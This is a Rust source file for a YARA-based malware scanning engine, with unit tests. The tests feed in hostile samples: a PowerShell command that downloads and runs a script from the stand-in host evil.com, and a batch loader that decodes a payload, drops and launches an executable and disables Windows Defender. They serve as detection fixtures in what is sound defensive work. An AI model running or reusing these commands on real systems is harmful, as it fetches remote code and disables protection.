//! YARA Engine - rule compilation + byte stream scanning.
//!
//! Compiles YARA rules into `yara_x::Rules` at startup,
//! then scans byte streams at runtime, returning matched rule lists.

use std::sync::Arc;
use std::time::Duration;

use tracing::{info, warn};

use super::rules::ALL_RULE_SOURCES;

/// A single YARA match result.
#[derive(Debug, Clone)]
pub struct YaraMatch {
    /// YARA rule name (e.g. "VBA_Macro_AutoExec").
    pub rule_name: String,
    /// Rule meta.category value.
    pub category: String,
    /// Rule meta.severity value.
    pub severity: String,
    /// Rule meta.description value.
    pub description: String,
}

/// YARA Engine: holds compiled rules, thread-safe.
pub struct YaraEngine {
    rules: Arc<yara_x::Rules>,
    rule_count: usize,
}

/// Extract a string value for the given key from a metadata vector.
fn extract_meta_str(meta: &[(&str, yara_x::MetaValue<'_>)], key: &str) -> Option<String> {
    meta.iter()
        .find(|(k, _)| *k == key)
        .and_then(|(_, v)| match v {
            yara_x::MetaValue::String(s) => Some(s.to_string()),
            _ => None,
        })
}

impl YaraEngine {
    /// Compile built-in rules and return an engine instance.
    /// Rule sources that fail to compile are skipped with a warning; the engine still starts.
    pub fn new() -> Result<Self, String> {
        let mut compiler = yara_x::Compiler::new();
        let mut failed_sources = 0u32;

        for (category, source) in ALL_RULE_SOURCES {
            match compiler.add_source(*source) {
                Ok(_) => {
                    info!(
                        category = *category,
                        "YARA rule source compiled successfully"
                    );
                }
                Err(e) => {
                    failed_sources += 1;
                    warn!(
                        category = *category,
                        error = %e,
                        "YARA rule source compilation failed, skipped"
                    );
                }
            }
        }

        let rules = compiler.build();
        let total_rules = rules.iter().count();

        if total_rules == 0 && failed_sources > 0 {
            return Err("All YARA rule sources failed to compile".to_string());
        }

        info!(
            rule_count = total_rules,
            failed_sources = failed_sources,
            "YARA engine initialized"
        );

        Ok(Self {
            rules: Arc::new(rules),
            rule_count: total_rules,
        })
    }

    /// Scan byte stream and return matching rules.
    pub fn scan(&self, data: &[u8]) -> Vec<YaraMatch> {
        let mut scanner = yara_x::Scanner::new(&self.rules);
        scanner.set_timeout(Duration::from_secs(10));

        let scan_results = match scanner.scan(data) {
            Ok(results) => results,
            Err(e) => {
                warn!(error = %e, "YARA scan failed");
                return Vec::new();
            }
        };

        scan_results
            .matching_rules()
            .map(|rule| {
                let meta: Vec<(&str, yara_x::MetaValue<'_>)> = rule.metadata().collect();
                let category = extract_meta_str(&meta, "category").unwrap_or_default();
                let severity =
                    extract_meta_str(&meta, "severity").unwrap_or_else(|| "high".to_string());
                let description = extract_meta_str(&meta, "description").unwrap_or_default();

                YaraMatch {
                    rule_name: rule.identifier().to_string(),
                    category,
                    severity,
                    description,
                }
            })
            .collect()
    }

    /// Compile from built-in + custom rule sources (merged from DB).
    pub fn new_with_custom(custom_sources: &[String]) -> Result<Self, String> {
        let mut compiler = yara_x::Compiler::new();
        let mut failed = 0u32;

        // Rule
        for (category, source) in ALL_RULE_SOURCES {
            if let Err(e) = compiler.add_source(*source) {
                failed += 1;
                warn!(category = *category, error = %e, "Built-in YARA rule compilation failed");
            }
        }

        // Rule
        for src in custom_sources {
            if let Err(e) = compiler.add_source(src.as_str()) {
                failed += 1;
                warn!(error = %e, "Custom YARA rule compilation failed");
            }
        }

        let rules = compiler.build();
        let total = rules.iter().count();

        info!(
            rule_count = total,
            custom = custom_sources.len(),
            failed = failed,
            "YARA engine compiled (built-in + custom)"
        );

        Ok(Self {
            rules: Arc::new(rules),
            rule_count: total,
        })
    }

    /// Total number of compiled rules.
    pub fn rule_count(&self) -> usize {
        self.rule_count
    }
}

// Tests

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_engine_compiles_all_rules() {
        let engine = YaraEngine::new().expect("YARA engine should initialize successfully");
        assert!(engine.rule_count() > 0, "Should have built-in rules");
        println!("Compiled {} YARA rules", engine.rule_count());
    }

    #[test]
    fn test_eicar_detected() {
        let engine = YaraEngine::new().unwrap();
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let matches = engine.scan(eicar);
        assert!(
            matches.iter().any(|m| m.rule_name == "EICAR_Test_File"),
            "Should detect EICAR test file, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_clean_text_no_match() {
        let engine = YaraEngine::new().unwrap();
        let clean = b"Hello, this is a normal business email about the quarterly report.";
        let matches = engine.scan(clean);
        assert!(matches.is_empty(), "Normal text should not match any rules");
    }

    #[test]
    fn test_batcloak_style_batch_loader_detected() {
        let engine = YaraEngine::new().unwrap();
        let sample = br#"@echo off
setlocal EnableDelayedExpansion
for /f %%i in ('whoami') do set user=%%i
call set stage=payload
powershell.exe -enc SQBFAFgA
certutil -decode a.txt b.bin
copy b.bin %TEMP%\dropper.exe
timeout /t 3
Set-MpPreference -DisableRealtimeMonitoring $true
sc stop WinDefend
start /b %TEMP%\dropper.exe
echo ^^done
"#;
        let matches = engine.scan(sample);
        assert!(
            matches
                .iter()
                .any(|m| m.rule_name == "Evasion_BatCloak_Obfuscated_Batch"),
            "Should detect BatCloak-style obfuscated batch loader, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_icedid_rule_ignores_pdf_lure_content() {
        let engine = YaraEngine::new().unwrap();
        let benign_pdf = b"%PDF-1.7\nIcedID research note\nJFIF\n\x1F\x8B\x08\nMZ\n";
        let matches = engine.scan(benign_pdf);
        assert!(
            !matches.iter().any(|m| m.rule_name == "Mal_IcedID_BokBot"),
            "PDF lure content should not match IcedID rule: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_icedid_rule_still_matches_binary_style_payload() {
        let engine = YaraEngine::new().unwrap();
        let payload =
            b"MZ\x90\x00PE\x00\x00IcedID InternetOpenA InternetConnectA NtCreateSection HttpSendRequestW";
        let matches = engine.scan(payload);
        assert!(
            matches.iter().any(|m| m.rule_name == "Mal_IcedID_BokBot"),
            "Binary-style IcedID indicators should still match: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_elf_header_detected() {
        let engine = YaraEngine::new().unwrap();
        let elf_data = vec![0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00];
        let matches = engine.scan(&elf_data);
        assert!(
            matches.iter().any(|m| m.rule_name == "ELF_In_Attachment"),
            "Should detect ELF binary, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_powershell_download_detected() {
        let engine = YaraEngine::new().unwrap();
        let ps_script = b"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"";
        let matches = engine.scan(ps_script);
        assert!(
            matches.iter().any(|m| m.category == "webshell"),
            "Should detect PowerShell downloader, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_yarax_module_compatibility() {
        // Verify yara-x 1.14 Module
        let module_tests = vec![
            (
                "pe.imports",
                r#"import "pe" rule t { condition: pe.imports("kernel32.dll") }"#,
            ),
            (
                "pe.sections",
                r#"import "pe" rule t { condition: pe.number_of_sections > 0 }"#,
            ),
            (
                "math.entropy",
                r#"import "math" rule t { condition: math.entropy(0, filesize) > 7.0 }"#,
            ),
            ("lnk", r#"import "lnk" rule t { condition: lnk.is_lnk }"#),
            (
                "dotnet",
                r#"import "dotnet" rule t { condition: dotnet.is_dotnet }"#,
            ),
            (
                "elf",
                r#"import "elf" rule t { condition: elf.type == elf.ET_EXEC }"#,
            ),
            (
                "hash",
                r#"import "hash" rule t { strings: $a = "t" condition: $a and hash.md5(0, filesize) == "x" }"#,
            ),
            (
                "macho",
                r#"import "macho" rule t { condition: macho.MH_EXECUTE > 0 }"#,
            ),
            ("uint16", r#"rule t { condition: uint16(0) == 0x5A4D }"#),
            ("filesize", r#"rule t { condition: filesize < 1000 }"#),
            (
                "basic_strings",
                r#"rule t { strings: $a = "test" condition: $a }"#,
            ),
            (
                "hex_strings",
                r#"rule t { strings: $h = { 4D 5A 90 00 } condition: $h }"#,
            ),
            (
                "regex",
                r#"rule t { strings: $r = /[a-z]{3,10}/ condition: $r }"#,
            ),
        ];
        println!("\n=== yara-x module compatibility ===");
        for (name, src) in &module_tests {
            let mut c = yara_x::Compiler::new();
            match c.add_source(*src) {
                Ok(_) => println!("  OK  {}", name),
                Err(e) => println!("FAIL  {}: {}", name, e),
            }
        }
        println!("===================================\n");
    }

    #[test]
    fn test_match_has_metadata() {
        let engine = YaraEngine::new().unwrap();
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let matches = engine.scan(eicar);
        let m = matches
            .iter()
            .find(|m| m.rule_name == "EICAR_Test_File")
            .expect("EICAR should match");
        assert_eq!(m.category, "malware_family");
        assert_eq!(m.severity, "critical");
        assert!(!m.description.is_empty());
    }
}
